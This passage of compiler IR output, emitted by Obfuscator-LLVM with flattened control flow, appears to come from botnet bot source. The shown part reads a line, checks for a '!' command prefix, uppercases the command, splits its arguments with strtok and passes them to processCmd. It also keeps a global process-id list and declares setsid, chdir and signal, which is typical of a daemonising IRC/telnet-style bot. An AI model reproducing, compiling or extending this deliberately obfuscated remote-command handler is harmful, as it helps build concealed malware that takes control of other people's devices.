  %132 = load i32, i32* %13, align 4
  %133 = zext i32 %132 to i64
  %134 = load i64, i64* @numpids, align 8
  %135 = icmp ult i64 %133, %134
  %136 = select i1 %135, i32 -795518664, i32 -2087724597
  store i32 %136, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  %138 = load i32*, i32** @pids, align 8
  %139 = load i32, i32* %13, align 4
  %140 = zext i32 %139 to i64
  %141 = getelementptr inbounds i32, i32* %138, i64 %140
  %142 = load i32, i32* %141, align 4
  %143 = load i32*, i32** %12, align 8
  %144 = load i32, i32* %13, align 4
  %145 = zext i32 %144 to i64
  %146 = getelementptr inbounds i32, i32* %143, i64 %145
  store i32 %142, i32* %146, align 4
  store i32 -1666344349, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = load i32, i32* %13, align 4
  %149 = add i32 %148, 1
  store i32 %149, i32* %13, align 4
  store i32 1626680864, i32* %switchVar
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %151 = load i32*, i32** @pids, align 8
  %152 = bitcast i32* %151 to i8*
  call void @free(i8* %152) #6
  %153 = load i32*, i32** %12, align 8
  store i32* %153, i32** @pids, align 8
  store i32 1777431464, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  store i32 949297668, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  %156 = load i32, i32* %11, align 4
  %157 = add nsw i32 %156, 1
  store i32 %157, i32* %11, align 4
  store i32 -1633186401, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i32, i32* %10, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %160
  store i8 0, i8* %161, align 1
  %162 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  call void @trim(i8* %162)
  %163 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  store i8* %163, i8** %14, align 8
  %164 = load i8*, i8** %14, align 8
  %165 = load i8, i8* %164, align 1
  %166 = zext i8 %165 to i32
  %167 = icmp eq i32 %166, 33
  %168 = select i1 %167, i32 42624496, i32 -20386168
  store i32 %168, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i8*, i8** %14, align 8
  %171 = getelementptr inbounds i8, i8* %170, i64 1
  store i8* %171, i8** %15, align 8
  store i32 524998191, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i8*, i8** %15, align 8
  %174 = load i8, i8* %173, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp ne i32 %175, 32
  %177 = select i1 %176, i32 1464624232, i32 1890479882
  store i32 %177, i32* %switchVar
  store i1 false, i1* %.reg2mem3
  br label %loopEnd

; <label>:178:                                    ; preds = %loopEntry
  %179 = load i8*, i8** %15, align 8
  %180 = load i8, i8* %179, align 1
  %181 = zext i8 %180 to i32
  %182 = icmp ne i32 %181, 0
  store i32 1890479882, i32* %switchVar
  store i1 %182, i1* %.reg2mem3
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %.reload4 = load i1, i1* %.reg2mem3
  %184 = select i1 %.reload4, i32 555252539, i32 224484600
  store i32 %184, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = load i8*, i8** %15, align 8
  %187 = getelementptr inbounds i8, i8* %186, i32 1
  store i8* %187, i8** %15, align 8
  store i32 524998191, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i8*, i8** %15, align 8
  %190 = load i8, i8* %189, align 1
  %191 = zext i8 %190 to i32
  %192 = icmp eq i32 %191, 0
  %193 = select i1 %192, i32 -1163807158, i32 -2107718436
  store i32 %193, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  store i32 261951118, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8*, i8** %15, align 8
  store i8 0, i8* %196, align 1
  %197 = load i8*, i8** %14, align 8
  %198 = getelementptr inbounds i8, i8* %197, i64 1
  store i8* %198, i8** %15, align 8
  %199 = load i8*, i8** %14, align 8
  %200 = load i8*, i8** %15, align 8
  %201 = call i64 @strlen(i8* %200) #10
  %202 = getelementptr inbounds i8, i8* %199, i64 %201
  %203 = getelementptr inbounds i8, i8* %202, i64 2
  store i8* %203, i8** %14, align 8
  store i32 372228825, i32* %switchVar
  br label %loopEnd

; <label>:204:                                    ; preds = %loopEntry
  %205 = load i8*, i8** %14, align 8
  %206 = load i8*, i8** %14, align 8
  %207 = call i64 @strlen(i8* %206) #10
  %208 = sub i64 %207, 1
  %209 = getelementptr inbounds i8, i8* %205, i64 %208
  %210 = load i8, i8* %209, align 1
  %211 = zext i8 %210 to i32
  %212 = icmp eq i32 %211, 10
  %213 = select i1 %212, i32 -1112463283, i32 2052958594
  store i32 %213, i32* %switchVar
  store i1 true, i1* %.reg2mem5
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = load i8*, i8** %14, align 8
  %216 = load i8*, i8** %14, align 8
  %217 = call i64 @strlen(i8* %216) #10
  %218 = sub i64 %217, 1
  %219 = getelementptr inbounds i8, i8* %215, i64 %218
  %220 = load i8, i8* %219, align 1
  %221 = zext i8 %220 to i32
  %222 = icmp eq i32 %221, 13
  store i32 -1112463283, i32* %switchVar
  store i1 %222, i1* %.reg2mem5
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %.reload6 = load i1, i1* %.reg2mem5
  %224 = select i1 %.reload6, i32 -1678923192, i32 -837117466
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = load i8*, i8** %14, align 8
  %227 = load i8*, i8** %14, align 8
  %228 = call i64 @strlen(i8* %227) #10
  %229 = sub i64 %228, 1
  %230 = getelementptr inbounds i8, i8* %226, i64 %229
  store i8 0, i8* %230, align 1
  store i32 372228825, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = load i8*, i8** %14, align 8
  store i8* %232, i8** %16, align 8
  store i32 1898462848, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i8*, i8** %14, align 8
  %235 = load i8, i8* %234, align 1
  %236 = zext i8 %235 to i32
  %237 = icmp ne i32 %236, 32
  %238 = select i1 %237, i32 -154521033, i32 132855777
  store i32 %238, i32* %switchVar
  store i1 false, i1* %.reg2mem7
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %240 = load i8*, i8** %14, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp ne i32 %242, 0
  store i32 132855777, i32* %switchVar
  store i1 %243, i1* %.reg2mem7
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %.reload8 = load i1, i1* %.reg2mem7
  %245 = select i1 %.reload8, i32 1250631248, i32 -1793440143
  store i32 %245, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load i8*, i8** %14, align 8
  %248 = getelementptr inbounds i8, i8* %247, i32 1
  store i8* %248, i8** %14, align 8
  store i32 1898462848, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = load i8*, i8** %14, align 8
  store i8 0, i8* %250, align 1
  %251 = load i8*, i8** %14, align 8
  %252 = getelementptr inbounds i8, i8* %251, i32 1
  store i8* %252, i8** %14, align 8
  %253 = load i8*, i8** %16, align 8
  store i8* %253, i8** %17, align 8
  store i32 1177813619, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = load i8*, i8** %17, align 8
  %256 = load i8, i8* %255, align 1
  %257 = icmp ne i8 %256, 0
  %258 = select i1 %257, i32 291420546, i32 -784857210
  store i32 %258, i32* %switchVar
  br label %loopEnd

; <label>:259:                                    ; preds = %loopEntry
  %260 = load i8*, i8** %17, align 8
  %261 = load i8, i8* %260, align 1
  %262 = zext i8 %261 to i32
  %263 = call i32 @toupper(i32 %262) #10
  %264 = trunc i32 %263 to i8
  %265 = load i8*, i8** %17, align 8
  store i8 %264, i8* %265, align 1
  %266 = load i8*, i8** %17, align 8
  %267 = getelementptr inbounds i8, i8* %266, i32 1
  store i8* %267, i8** %17, align 8
  store i32 1177813619, i32* %switchVar
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  store i32 1, i32* %19, align 4
  %269 = load i8*, i8** %14, align 8
  %270 = call i8* @strtok(i8* %269, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0)) #6
  store i8* %270, i8** %20, align 8
  %271 = load i8*, i8** %16, align 8
  %272 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 0
  store i8* %271, i8** %272, align 16
  store i32 56003313, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = load i8*, i8** %20, align 8
  %275 = icmp ne i8* %274, null
  %276 = select i1 %275, i32 162800866, i32 1787459755
  store i32 %276, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  %278 = load i8*, i8** %20, align 8
  %279 = load i8, i8* %278, align 1
  %280 = zext i8 %279 to i32
  %281 = icmp ne i32 %280, 10
  %282 = select i1 %281, i32 790373396, i32 -365077620
  store i32 %282, i32* %switchVar
  br label %loopEnd

; <label>:283:                                    ; preds = %loopEntry
  %284 = load i8*, i8** %20, align 8
  %285 = call i64 @strlen(i8* %284) #10
  %286 = add i64 %285, 1
  %287 = call noalias i8* @malloc(i64 %286) #6
  %288 = load i32, i32* %19, align 4
  %289 = sext i32 %288 to i64
  %290 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %289
  store i8* %287, i8** %290, align 8
  %291 = load i32, i32* %19, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %292
  %294 = load i8*, i8** %293, align 8
  %295 = load i8*, i8** %20, align 8
  %296 = call i64 @strlen(i8* %295) #10
  %297 = add i64 %296, 1
  call void @llvm.memset.p0i8.i64(i8* %294, i8 0, i64 %297, i32 1, i1 false)
  %298 = load i32, i32* %19, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %299
  %301 = load i8*, i8** %300, align 8
  %302 = load i8*, i8** %20, align 8
  %303 = call i8* @strcpy(i8* %301, i8* %302) #6
  %304 = load i32, i32* %19, align 4
  %305 = add nsw i32 %304, 1
  store i32 %305, i32* %19, align 4
  store i32 -365077620, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0)) #6
  store i8* %307, i8** %20, align 8
  store i32 56003313, i32* %switchVar
  br label %loopEnd

; <label>:308:                                    ; preds = %loopEntry
  %309 = load i32, i32* %19, align 4
  %310 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i32 0, i32 0
  call void @processCmd(i32 %309, i8** %310)
  %311 = load i32, i32* %19, align 4
  %312 = icmp sgt i32 %311, 1
  %313 = select i1 %312, i32 -1055605131, i32 1108682695
  store i32 %313, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  store i32 1, i32* %21, align 4
  store i32 1, i32* %21, align 4
  store i32 506602157, i32* %switchVar
  br label %loopEnd

; <label>:315:                                    ; preds = %loopEntry
  %316 = load i32, i32* %21, align 4
  %317 = load i32, i32* %19, align 4
  %318 = icmp slt i32 %316, %317
  %319 = select i1 %318, i32 1964168835, i32 210506497
  store i32 %319, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load i32, i32* %21, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %322
  %324 = load i8*, i8** %323, align 8
  call void @free(i8* %324) #6
  store i32 1561512177, i32* %switchVar
  br label %loopEnd

; <label>:325:                                    ; preds = %loopEntry
  %326 = load i32, i32* %21, align 4
  %327 = add nsw i32 %326, 1
  store i32 %327, i32* %21, align 4
  store i32 506602157, i32* %switchVar
  br label %loopEnd

; <label>:328:                                    ; preds = %loopEntry
  store i32 1108682695, i32* %switchVar
  br label %loopEnd

; <label>:329:                                    ; preds = %loopEntry
  store i32 -20386168, i32* %switchVar
  br label %loopEnd

; <label>:330:                                    ; preds = %loopEntry
  store i32 261951118, i32* %switchVar
  br label %loopEnd

; <label>:331:                                    ; preds = %loopEntry
  store i32 683646627, i32* %switchVar
  br label %loopEnd

; <label>:332:                                    ; preds = %loopEntry
  %333 = load i32, i32* %3, align 4
  ret i32 %333

loopEnd:                                          ; preds = %331, %330, %329, %328, %325, %320, %315, %314, %308, %306, %283, %277, %273, %268, %259, %254, %249, %246, %244, %239, %233, %231, %225, %223, %214, %204, %195, %194, %188, %185, %183, %178, %172, %169, %158, %155, %154, %150, %147, %137, %131, %118, %115, %104, %98, %95, %86, %80, %79, %73, %64, %62, %58, %54, %53, %52, %51, %50, %49, %48, %44, %39, %35, %first, %switchDefault
  br label %loopEntry
}

declare i32 @waitpid(i32, i32*, i32) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: nounwind
declare i32 @setsid() #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #5

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone }
attributes #10 = { nounwind readonly }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146660393}
!2 = !{i32 -2146659702}
!3 = !{i32 -2146658953}
